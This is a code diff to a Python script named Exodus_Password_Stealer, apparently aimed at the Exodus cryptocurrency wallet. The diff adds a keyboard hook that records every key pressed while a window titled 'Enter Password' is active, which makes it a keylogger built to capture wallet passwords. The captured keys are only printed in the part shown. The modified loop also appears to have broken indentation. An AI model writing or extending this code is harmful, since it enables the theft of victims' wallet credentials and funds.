@@ -5,10 +5,14 @@ from typing import Union
 from modules.tasks import Tasks
 from modules.current_window import Current_Window
 
+def on_key_press(event):
+    if Current_Window.fetch_one()["title"] == "Enter Password":
+        print(f"Key Pressed: {event.name}")
+
 class Exodus_Password_Stealer:
     def __init__(self, exectuable_name: str) -> None:
         self.executable_name: str = exectuable_name
-        
+    
     def current_active_window(self) -> dict[str]:
         return Current_Window.fetch_one()
         
@@ -23,11 +27,8 @@ class Exodus_Password_Stealer:
     def start_listener(self):
         while True:
             if self.check_if_running() == True:
-                current_active_window: dict[str] = self.current_active_window()
-                
-                if current_active_window["title"] == "Enter Password":
+                keyboard.on_press(on_key_press); keyboard.wait('enter')
                     
-                
                 time.sleep(0.2)
         
 if __name__ == "__main__":
